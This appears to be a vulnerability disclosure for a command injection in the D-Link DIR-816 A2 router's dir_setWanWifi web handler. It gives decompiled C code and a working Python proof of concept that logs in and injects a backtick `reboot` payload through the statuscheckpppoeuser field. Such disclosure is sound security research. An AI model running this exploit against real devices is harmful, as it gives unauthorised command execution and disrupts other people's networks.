## DIR 816

> bin_vision:DIR-816A2_v1.10CNB03_D77137
> goahead
> goform/dir_setWanWifi
>
> type: command injection
> string: statuscheckpppoeuser

### description

The `dir_setWanWifi` handler receives the user-controlled `statuscheckpppoeuser` parameter from the GoAhead web request. The value is read directly via `websGetVar()` with no sanitization. It is interpolated into an `echo` command via `sprintf()` and passed to `system()` for shell execution.

Vulnerability chain: `websGetVar("statuscheckpppoeuser")` -> `sprintf("echo %s >/tmp/statuscheckpppoeuser")` -> `system(cmd)`.

An authenticated attacker can inject shell metacharacters (e.g. backticks) in the `statuscheckpppoeuser` field to achieve command execution when the WAN/Wi-Fi configuration is saved.

### code

#### dir_setWanWifi handler

~~~c
  websFormDefine("dir_setWanWifi", (int)dir_setWanWifi_handler);
~~~

~~~c
// dir_setWanWifi handler
void dir_setWanWifi(int wp)
{
    char v32[256];
    char *v6 = websGetVar(wp, "statuscheckpppoeuser", "");  // <--- Read user-controlled input from the request

    // Direct interpolation into system command - NO SANITIZATION
    sprintf(v32, "echo %s >/tmp/statuscheckpppoeuser", v6); // <--- Insert statuscheckpppoeuser into echo command
    system(v32);                                             // <--- Execute command with tainted value; command injection triggers here
}
~~~

### PoC

Source: `PoC/CNB03_v1.10/verified/poc_dir_setWanWifi.py`

```python
"""
D-Link DIR-816 A2 - Command Injection in WAN WiFi Setup (dir_setWanWifi)
Firmware: DIR-816A2_v1.10CNB03_D77137
Entry: 000267
Endpoint: /goform/dir_setWanWifi
Parameter: statuscheckpppoeuser
Sink: sprintf(v32, "echo %s >/tmp/statuscheckpppoeuser", v6); system(v32) - DIRECT
"""

import requests
import base64
import time
import sys
import re

ROUTER_IP = "192.168.1.1"
USERNAME = "Admin"
PASSWORD = ""


def get_session():
    s = requests.Session()
    username_b64 = base64.b64encode(USERNAME.encode()).decode()
    password_b64 = base64.b64encode(PASSWORD.encode()).decode()
    login_data = {"username": username_b64, "password": password_b64}
    resp = s.post(f"http://{ROUTER_IP}/goform/formLogin", data=login_data, timeout=10)
    tokenid = ""
    match = re.search(r'tokenid"\s*value="(\d+)"', resp.text)
    if match:
        tokenid = match.group(1)
    return s, tokenid


def exploit():
    print(f"[*] Target: {ROUTER_IP}")
    print(f"[*] Vulnerability: Command Injection in WAN WiFi Setup (dir_setWanWifi)")
    print(f"[*] Endpoint: /goform/dir_setWanWifi")
    print(f"[*] Parameter: statuscheckpppoeuser")
    print()
    print("[*] Logging in...")
    s, tokenid = get_session()
    if not tokenid:
        print("[-] Failed to get tokenid")
        sys.exit(1)
    print(f"[*] Got tokenid: {tokenid}")

    payload = "`reboot`"
    data = {"tokenid": tokenid, "statuscheckpppoeuser": payload}
    print(f"[*] Sending payload: {payload}")
    start = time.time()
    try:
        resp = s.post(f"http://{ROUTER_IP}/goform/dir_setWanWifi", data=data, timeout=30)
    except requests.exceptions.Timeout:
        elapsed = time.time() - start
        print(f"[+] VULNERABLE! Request timed out after {elapsed:.2f}s")
        return
    except requests.exceptions.ConnectionError:
        elapsed = time.time() - start
        print(f"[+] VULNERABLE! Connection lost after {elapsed:.2f}s (device rebooted)")
        return
    elapsed = time.time() - start
    print(f"[*] Response time: {elapsed:.2f}s")

    # For reboot payload: device responds quickly then goes offline
    print("[*] Waiting 8s to check if device rebooted...")
    time.sleep(8)
    try:
        check = requests.get(f"http://{ROUTER_IP}/", timeout=5)
        print(f"[-] Device still online ({check.status_code}) — payload did not execute")
    except Exception:
        print("[+] VULNERABLE! Device went offline after payload (rebooted)")


if __name__ == "__main__":
    if len(sys.argv) > 1:
        ROUTER_IP = sys.argv[1]
    exploit()
```
